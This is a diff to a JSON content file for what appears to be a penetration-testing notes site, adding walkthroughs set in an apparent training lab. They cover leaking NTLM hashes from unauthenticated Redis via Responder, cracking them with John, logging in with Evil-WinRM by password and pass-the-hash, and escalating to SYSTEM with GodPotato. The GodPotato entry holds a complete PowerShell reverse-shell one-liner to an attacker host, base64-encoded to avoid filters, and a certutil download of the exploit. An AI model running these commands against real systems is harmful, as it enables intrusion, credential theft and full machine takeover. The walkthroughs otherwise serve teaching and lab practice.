@@ -7544,6 +7544,15 @@
     "explanationFile": "/Explantion/SUDO/ld_library_path.json"
   },
   {
+    "id": 23,
+    "slug": "powershell-exp",
+    "title": "Powershell",
+    "category": "notes",
+    "scriptFile": "/Shell-Scripts/RevShells/powershell.ps1",
+    "language": "powershell",
+    "explanationFile": "/Explantion/RevShells/powershell.json"
+  },
+  {
     "id": 27,
     "slug": "cve-2016-1531",
     "title": "CVE-2016-1531",
@@ -9662,6 +9671,326 @@
           "Identified the Administrator's NTLM hash from the dump",
           "Used Pass-the-Hash with Evil-WinRM to gain a Domain Admin shell",
           "Collected user.txt and root.txt flags"
+        ]
+      }
+    ]
+  },
+  {
+    "id": 39,
+    "slug": "redis",
+    "title": "Redis Exploitation",
+    "isLab": false,
+    "category": "notes",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocksFile": "./blocks/ActiveDirectory/redis.json",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "redis-enum-intro",
+        "text": "Phase 1: Redis Enumeration & NTLM Leakage"
+      },
+      {
+        "type": "order_block",
+        "id": "redis-theory",
+        "text": "Redis (Remote Dictionary Server) is an in-memory data structure store. When left unauthenticated (Anonymous Access), it becomes a high-risk vector for <highlight>Configuration Poisoning</highlight>. In Windows environments, we can manipulate Redis to interact with a remote UNC path, forcing the underlying service account to leak its <highlight>Net-NTLMv2 hash</highlight> via the SMB protocol."
+      },
+      {
+        "type": "section_heading",
+        "id": "redis-discovery",
+        "text": "Step 1: Identifying Anonymous Redis Access & Parameters"
+      },
+      {
+        "type": "order_block",
+        "id": "redis-discovery-logic",
+        "text": "We begin by checking if the Redis service on port <highlight>6379</highlight> allows connections without a password. Once connected, we use the <highlight>config get *</highlight> command to enumerate available parameters. This confirms the current working directory and database filename settings."
+      },
+      {
+        "type": "code_block",
+        "id": "redis-cli-connect",
+        "language": "bash",
+        "code": "redis-cli -h <TARGET_IP>\nconfig get dir\nconfig get dbfilename"
+      },
+      {
+        "type": "output_block",
+        "id": "redis-info-output",
+        "language": "text",
+        "code": "1) \"dir\"\n2) \"C:\\\\Program Files\\\\Redis\"\n3) \"dbfilename\"\n4) \"dump.rdb\""
+      },
+      {
+        "type": "section_heading",
+        "id": "redis-ntlm-leak",
+        "text": "Step 2: Triggering NTLM Authentication Leak"
+      },
+      {
+        "type": "order_block",
+        "id": "responder-setup",
+        "text": "To capture the hash, we initiate <highlight>Responder</highlight> on our Kali machine. This tool acts as a rogue SMB server. Even without a real shared folder, Responder will intercept any incoming SMB handshake requests from the target."
+      },
+      {
+        "type": "code_block",
+        "id": "responder-exec",
+        "language": "bash",
+        "code": "sudo responder -I tun0 -v"
+      },
+      {
+        "type": "order_block",
+        "id": "redis-poisoning-logic",
+        "text": "Executing <highlight>config set dir</highlight> only updates the setting in memory and does not generate network traffic. To force a connection, we must trigger a file-write operation. By setting a <highlight>dbfilename</highlight> and issuing the <highlight>save</highlight> command, Windows is forced to authenticate with our rogue share to check for write permissions, thus leaking the hash."
+      },
+      {
+        "type": "code_block",
+        "id": "redis-commands",
+        "language": "bash",
+        "code": "config set dir \\\\<KALI_IP>\\share\nconfig set dbfilename redis.rdb\nsave"
+      },
+      {
+        "type": "output_block",
+        "id": "responder-capture-output",
+        "language": "text",
+        "code": "[+] Listening for events...\n[SMB] NTLMv2-SSP Client   : 10.10.154.40\n[SMB] NTLMv2-SSP Username : VULNNET\\enterprise-security\n[SMB] NTLMv2-SSP Hash     : enterprise-security::VULNNET:4e51...000000000000000000000000000"
+      },
+      {
+        "type": "section_heading",
+        "id": "redis-hash-cracking",
+        "text": "Step 3: Offline Brute-Force Cracking"
+      },
+      {
+        "type": "order_block",
+        "id": "cracking-logic",
+        "text": "The captured Net-NTLMv2 hash cannot be used for 'Pass-the-Hash' attacks. We must perform an offline dictionary attack using <highlight>John the Ripper</highlight> and the <highlight>RockYou.txt</highlight> wordlist to recover the cleartext password."
+      },
+      {
+        "type": "code_block",
+        "id": "john-exec",
+        "language": "bash",
+        "code": "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt"
+      },
+      {
+        "type": "output_block",
+        "id": "john-success-output",
+        "language": "text",
+        "code": "Loaded 1 password hash (NTLMv2-SSP [MD4/HMAC-MD5 128/128 AVX 4x])\nsand_0873959498  (enterprise-security)\n1 password cracked, 0 left"
+      },
+      {
+        "type": "explanation",
+        "id": "redis-summary",
+        "title": "Technical Summary of Phase 1",
+        "items": [
+          "Vulnerability: Anonymous Redis access (Misconfiguration)",
+          "Discovery: Used 'config get' to identify modifiable backup parameters",
+          "Mechanism: Triggered an SMB write request via the 'save' command to leak NTLMv2 hashes",
+          "Result: Gained valid domain credentials (VULNNET\\enterprise-security) after offline cracking"
+        ]
+      }
+    ]
+  },
+  {
+    "id": 40,
+    "slug": "winrm",
+    "title": "Winrm",
+    "isLab": false,
+    "category": "notes",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocksFile": "./blocks/ActiveDirectory/winrm.json",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "winrm-intro",
+        "text": "Remote Access: Establishing a Shell via WinRM"
+      },
+      {
+        "type": "order_block",
+        "id": "winrm-theory",
+        "text": "WinRM (Windows Remote Management) is a Microsoft protocol that allows for remote management of systems over HTTP/HTTPS. Using <highlight>Evil-WinRM</highlight>, we can obtain an interactive PowerShell session if we have valid user credentials or their NTLM hashes."
+      },
+      {
+        "type": "section_heading",
+        "id": "winrm-password-login",
+        "text": "Method 1: Authentication via Plaintext Password"
+      },
+      {
+        "type": "order_block",
+        "id": "winrm-pass-logic",
+        "text": "When we have recovered the cleartext password (e.g., through cracking a hash with John the Ripper), we can log in directly. This provides a full interactive PowerShell environment."
+      },
+      {
+        "type": "code_block",
+        "id": "evil-winrm-pass",
+        "language": "bash",
+        "code": "evil-winrm -i <TARGET_IP> -u 'enterprise-security' -p 'sand_0873959498'"
+      },
+      {
+        "type": "output_block",
+        "id": "winrm-pass-output",
+        "language": "text",
+        "code": "Info: Establishing connection to <TARGET_IP>...\n*Evil-WinRM* PS C:\\Users\\enterprise-security\\Documents> whoami\nvulnnet\\enterprise-security"
+      },
+      {
+        "type": "section_heading",
+        "id": "winrm-pth-login",
+        "text": "Method 2: Authentication via Pass-the-Hash (PtH)"
+      },
+      {
+        "type": "order_block",
+        "id": "winrm-pth-logic",
+        "text": "In many cases, we might capture an NTLM hash (e.g., from Mimikatz or SecretsDump) but cannot crack it. WinRM allows us to use the <highlight>NTLM hash</highlight> itself for authentication without ever needing the original password."
+      },
+      {
+        "type": "code_block",
+        "id": "evil-winrm-hash",
+        "language": "bash",
+        "code": "evil-winrm -i <TARGET_IP> -u 'enterprise-security' -H '32196B35ED094F013B6188B740664504'"
+      },
+      {
+        "type": "order_block",
+        "id": "hash-format-tip",
+        "text": "Note: When using the <highlight>-H</highlight> flag, you only need the NT portion of the hash (the last part of a standard LM:NT string)."
+      },
+      {
+        "type": "output_block",
+        "id": "winrm-hash-output",
+        "language": "text",
+        "code": "Info: Establishing connection to <TARGET_IP>...\n*Evil-WinRM* PS C:\\Users\\enterprise-security\\Documents> hostname\nVULNNET-PROD"
+      },
+      {
+        "type": "explanation",
+        "id": "winrm-features",
+        "title": "Evil-WinRM Advanced Features",
+        "items": [
+          "File Transfer: Built-in 'upload' and 'download' commands for easy file movement",
+          "Memory Loading: Ability to load PowerShell scripts directly into memory (Bypassing some AVs)",
+          "Persistent Shell: Provides a more stable connection than basic Netcat reverse shells",
+          "Pass-the-Hash: Support for NTLM hash authentication for uncrackable passwords"
+        ]
+      }
+    ]
+  },
+  {
+    "id": 41,
+    "slug": "god-potato",
+    "title": "GodPotato",
+    "isLab": false,
+    "category": "notes",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocksFile": "./blocks/ActiveDirectory/god-potato.json",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "priv-esc-intro",
+        "text": "Phase 3: Privilege Escalation (GodPotato)"
+      },
+      {
+        "type": "order_block",
+        "id": "seimpersonate-logic",
+        "text": "The discovery of <highlight>SeImpersonatePrivilege</highlight> is a critical finding. This privilege allows a process to impersonate a client after authentication. By using an exploit from the 'Potato' family, we can trick a SYSTEM-level service into authenticating with us, capturing its token, and spawning a shell as <highlight>NT AUTHORITY\\SYSTEM</highlight>."
+      },
+      {
+        "type": "section_heading",
+        "id": "exploit-transfer",
+        "text": "Step 1: Transferring the Exploit to Target"
+      },
+      {
+        "type": "order_block",
+        "id": "transfer-logic",
+        "text": "We move the <highlight>GodPotato-Net4.exe</highlight> binary from our Kali machine to the Windows target using <highlight>certutil.exe</highlight>."
+      },
+      {
+        "type": "code_block",
+        "id": "kali-server",
+        "language": "bash",
+        "code": "# On Kali (Start a web server)\npython3 -m http.server 80"
+      },
+      {
+        "type": "code_block",
+        "id": "target-download",
+        "language": "powershell",
+        "code": "# On Windows Shell\ncertutil -urlcache -f http://<KALI_IP>/GodPotato-Net4.exe gp.exe"
+      },
+      {
+        "type": "section_heading",
+        "id": "execution-escalation",
+        "text": "Step 2: Executing GodPotato for SYSTEM Shell"
+      },
+      {
+        "type": "order_block",
+        "id": "godpotato-exec-logic",
+        "text": "First, we verify the exploit works by running a simple <highlight>whoami</highlight>. If successful, it confirms we can impersonate the SYSTEM token."
+      },
+      {
+        "type": "code_block",
+        "id": "gp-run-command",
+        "language": "powershell",
+        "code": ".\\gp.exe -cmd \"whoami\""
+      },
+      {
+        "type": "output_block",
+        "id": "gp-output",
+        "language": "text",
+        "code": "[*] Starting the DCOM server...\n[*] Triggering the authentication...\n[*] Impersonating the SYSTEM token...\nnt authority\\system"
+      },
+      {
+        "type": "section_heading",
+        "id": "system-reverse-shell",
+        "text": "Step 2.1: The Raw Reverse Shell Payload"
+      },
+      {
+        "type": "order_block",
+        "id": "system-shell-logic",
+        "text": "We use GodPotato to execute a PowerShell reverse shell one-liner. However, directly passing complex symbols like <highlight>$</highlight>, <highlight>\"</highlight>, and <highlight>()</highlight> inside the <highlight>-cmd</highlight> flag often causes the command to break or get blocked by security filters."
+      },
+      {
+        "type": "code_block",
+        "id": "gp-rev-shell-raw",
+        "language": "powershell",
+        "code": "# Raw PowerShell One-Liner\n$c=New-Object Net.Sockets.TCPClient('<KALI_IP>',9001);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=([Text.Encoding]::ASCII).GetBytes($sb);$s.Write($sb2,0,$sb2.Length);$s.Flush()};$c.Close()"
+      },
+      {
+        "type": "section_heading",
+        "id": "base64-encoding-logic",
+        "text": "Step 2.2: Encoding for Stability (Base64)"
+      },
+      {
+        "type": "order_block",
+        "id": "base64-logic",
+        "text": "To ensure the shell executes correctly and bypasses simple syntax errors, we must convert the raw payload into <highlight>Base64 (UTF-16LE)</highlight>. This allows us to use the <highlight>-EncodedCommand</highlight> flag, making the execution much more stable under GodPotato."
+      },
+      {
+        "type": "code_block",
+        "id": "kali-encoding",
+        "language": "bash",
+        "code": "# On Kali: Convert the raw shell to Base64\necho -n '$c=New-Object Net.Sockets.TCPClient(\"<KALI_IP>\",9001);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=([Text.Encoding]::ASCII).GetBytes($sb);$s.Write($sb2,0,$sb2.Length);$s.Flush()};$c.Close()' | iconv -t utf-16le | base64 -w 0"
+      },
+      {
+        "type": "code_block",
+        "id": "gp-encoded-exec",
+        "language": "powershell",
+        "code": "# Execute the Encoded Payload via GodPotato\n.\\gp.exe -cmd \"powershell -EncodedCommand <BASE64_STRING>\""
+      },
+      {
+        "type": "section_heading",
+        "id": "final-flag-capture",
+        "text": "Step 3: Systematic Root Flag Capture"
+      },
+      {
+        "type": "order_block",
+        "id": "root-flag-logic",
+        "text": "With SYSTEM privileges, we perform a final enumeration to list all users, identify their directories, and locate the root flag filename before reading its content."
+      },
+      {
+        "type": "code_block",
+        "id": "read-flag",
+        "language": "powershell",
+        "code": "# 1. List all system users to confirm targets\n.\\gp.exe -cmd \"cmd.exe /c net user\"\n\n# 2. List the Users directory to check folder structure\n.\\gp.exe -cmd \"cmd.exe /c dir C:\\Users\"\n\n# 3. List the Administrator's Desktop to find the root flag name\n.\\gp.exe -cmd \"cmd.exe /c dir C:\\Users\\Administrator\\Desktop\"\n\n# 4. Final Capture: Read the root flag content\n.\\gp.exe -cmd \"cmd.exe /c type C:\\Users\\Administrator\\Desktop\\root.txt\""
+      },
+      {
+        "type": "explanation",
+        "id": "potato-summary",
+        "title": "Potato Attack Mechanism Summary",
+        "items": [
+          "Vulnerability: SeImpersonatePrivilege (Standard on many service accounts)",
+          "Exploit: GodPotato triggers a DCOM/RPC call to force SYSTEM authentication",
+          "Stability: Base64 encoding prevents syntax breaking within the -cmd argument",
+          "Outcome: Full Administrative control (NT AUTHORITY\\SYSTEM) over the machine"
         ]
       }
     ]
